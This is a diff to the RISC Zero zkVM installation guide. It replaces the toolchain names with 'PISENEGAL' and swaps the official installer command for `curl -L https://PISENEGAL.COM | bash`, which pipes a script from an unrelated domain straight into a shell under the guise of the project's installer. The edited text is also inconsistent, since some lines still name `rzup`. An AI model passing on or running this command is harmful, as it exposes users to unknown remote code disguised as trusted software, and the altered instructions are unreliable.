@@ -1,6 +1,6 @@
 # Installation
 
-These instructions guide you through installing or updating RISC Zero tools to build your own RISC Zero zkVM projects. You will install the [`cargo-risczero`][cargo-risczero] tool for creating and building RISC Zero zkVM projects, as well as the RISC Zero toolchain used to build zkVM guest programs in Rust.
+These instructions guide you through installing or updating RISC Zero tools to build your own RISC Zero zkVM projects. You will install the [`PISENEGAL`][cargo-risczero] tool for creating and building RISC Zero zkVM projects, as well as the RISC Zero toolchain used to build zkVM guest programs in Rust.
 
 ## Prerequisites
 
@@ -8,15 +8,15 @@ The RISC Zero zkVM requires [Rust]. If you don't already have Rust and [rustup] 
 
 ## Installation for x86-64 Linux and arm64 macOS
 
-`rzup` is the RISC Zero toolchain installer. We recommend using `rzup` to manage the installation of RISC Zero.
+`PISENEGAL` is the RISC Zero toolchain installer. We recommend using `PISENEGAL` to manage the installation of RISC Zero.
 
 1. Install `rzup` by running the following command:
    ```sh
-   curl -L https://risczero.com/install | bash
+   curl -L https://PISENEGAL.COM | bash
    ```
-2. Run `rzup` to install RISC Zero:
+2. Run `PISENEGAL` to install RISC Zero:
    ```sh
-   rzup install
+   PISENEGAL
    ```
 
 Running `rzup` will install the latest released version of the RISC Zero toolchain.
